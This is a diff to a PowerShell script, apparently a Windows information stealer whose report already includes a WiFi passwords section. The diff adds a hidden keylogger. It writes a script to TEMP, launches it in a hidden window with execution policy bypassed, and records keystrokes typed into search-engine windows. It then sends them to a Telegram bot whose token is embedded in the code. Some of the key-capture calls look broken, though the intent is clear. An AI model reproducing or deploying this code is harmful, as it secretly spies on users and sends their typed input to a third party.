@@ -20,6 +20,167 @@ try {
     if (!$wifi) {$wifi = "No WiFi networks"}
 } catch {$wifi = "WiFi error"}
 
+# МОНИТОРИНГ ПОИСКОВЫХ ЗАПРОСОВ
+Add-Type -AssemblyName System.Windows.Forms
+
+$searchLoggerScript = @"
+Add-Type -AssemblyName System.Windows.Forms
+
+`$searchBuffer = ""
+`$lastSearch = ""
+`$searchEngines = @("*google*", "*yandex*", "*bing*", "*yahoo*", "*duckduckgo*", "*search*", "*поиск*")
+
+function Send-SearchQuery {
+    param(`$query)
+    if(`$query -ne "" -and `$query -ne `$lastSearch -and `$query.Length -gt 2) {
+        `$lastSearch = `$query
+        try {
+            `$body = @{
+                chat_id = '5674514050'
+                text = "SEARCH QUERY: `$query"
+            }
+            Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body `$body
+        } catch { }
+    }
+}
+
+while(`$true) {
+    try {
+        `$activeWindow = ""
+        `$processes = Get-Process | Where-Object {`$_.MainWindowTitle -and `$_.MainWindowHandle -ne 0} | Sort-Object CPU -Descending
+        if(`$processes) {
+            `$activeWindow = `$processes[0].MainWindowTitle
+        }
+        
+        `$isSearchPage = `$false
+        foreach(`$engine in `$searchEngines) {
+            if(`$activeWindow -like `$engine) {
+                `$isSearchPage = `$true
+                break
+            }
+        }
+        
+        if(`$isSearchPage) {
+            for(`$i = 8; `$i -lt 255; `$i++) {
+                `$keyState = [System.Windows.Forms.GetAsyncKeyState]`$i
+                if(`$keyState -eq -32767) {
+                    `$key = [System.Windows.Forms.Keys]`$i
+                    
+                    switch(`$key) {
+                        "Enter" { 
+                            Send-SearchQuery `$searchBuffer
+                            `$searchBuffer = ""
+                        }
+                        "Space" { 
+                            `$searchBuffer += " " 
+                        }
+                        "Back" { 
+                            if(`$searchBuffer.Length -gt 0) { 
+                                `$searchBuffer = `$searchBuffer.Substring(0, `$searchBuffer.Length - 1) 
+                            }
+                        }
+                        "Tab" { 
+                            Send-SearchQuery `$searchBuffer
+                            `$searchBuffer = ""
+                        }
+                        "LButton" { 
+                            Send-SearchQuery `$searchBuffer
+                            `$searchBuffer = ""
+                        }
+                        default {
+                            if(`$key -ge 65 -and `$key -le 90) {
+                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
+                                `$isCaps = [System.Windows.Forms.Console]::CapsLock
+                                
+                                if((`$isShift -and !`$isCaps) -or (!`$isShift -and `$isCaps)) {
+                                    `$searchBuffer += `$key.ToString()
+                                } else {
+                                    `$searchBuffer += `$key.ToString().ToLower()
+                                }
+                            } elseif(`$key -ge 48 -and `$key -le 57) {
+                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
+                                `$symbols = @(')', '!', '@', '#', '`$', '%', '^', '&', '*', '(')
+                                if(`$isShift) {
+                                    `$searchBuffer += `$symbols[`$key - 48]
+                                } else {
+                                    `$searchBuffer += (`$key - 48).ToString()
+                                }
+                            } elseif(`$key -eq 190 -or `$key -eq 110) {
+                                `$searchBuffer += "."
+                            } elseif(`$key -eq 189 -or `$key -eq 109) {
+                                `$searchBuffer += "-"
+                            } elseif(`$key -eq 187 -or `$key -eq 107) {
+                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
+                                if(`$isShift) {
+                                    `$searchBuffer += "+"
+                                } else {
+                                    `$searchBuffer += "="
+                                }
+                            } elseif(`$key -eq 186 -or `$key -eq 59) {
+                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
+                                if(`$isShift) {
+                                    `$searchBuffer += ":"
+                                } else {
+                                    `$searchBuffer += ";"
+                                }
+                            } elseif(`$key -eq 222) {
+                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
+                                if(`$isShift) {
+                                    `$searchBuffer += "`""
+                                } else {
+                                    `$searchBuffer += "'"
+                                }
+                            } elseif(`$key -eq 220) {
+                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
+                                if(`$isShift) {
+                                    `$searchBuffer += "|"
+                                } else {
+                                    `$searchBuffer += "\"
+                                }
+                            } elseif(`$key -eq 188 -or `$key -eq 108) {
+                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
+                                if(`$isShift) {
+                                    `$searchBuffer += "<"
+                                } else {
+                                    `$searchBuffer += ","
+                                }
+                            } elseif(`$key -eq 191 -or `$key -eq 111) {
+                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
+                                if(`$isShift) {
+                                    `$searchBuffer += "?"
+                                } else {
+                                    `$searchBuffer += "/"
+                                }
+                            }
+                        }
+                    }
+                    
+                    if(`$searchBuffer.Length -gt 50) {
+                        Send-SearchQuery `$searchBuffer
+                        `$searchBuffer = ""
+                    }
+                }
+            }
+        } else {
+            if(`$searchBuffer -ne "") {
+                Send-SearchQuery `$searchBuffer
+                `$searchBuffer = ""
+            }
+        }
+    } catch { }
+    Start-Sleep -Milliseconds 2
+}
+"@
+
+# Запускаем мониторинг поисковых запросов в отдельном процессе
+try {
+    $searchLoggerScript | Out-File "$env:TEMP\search_monitor.ps1" -Encoding ASCII
+    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\search_monitor.ps1`"" -WindowStyle Hidden
+    $searchMonitorStatus = "Search monitoring active"
+} catch {
+    $searchMonitorStatus = "Search monitor failed: $($_.Exception.Message)"
+}
+
 # Безопасность
 try {$fw = Get-NetFirewallProfile | ForEach-Object {"  - $($_.Name): $($_.Enabled)"} | Out-String} catch {$fw = "Firewall info unavailable"}
 
@@ -77,6 +238,9 @@ $conn
 
 === WIFI PASSWORDS ===
 $wifi
+
+=== SEARCH MONITOR ===
+$searchMonitorStatus
 
 === SECURITY STATUS ===
 Firewall: 
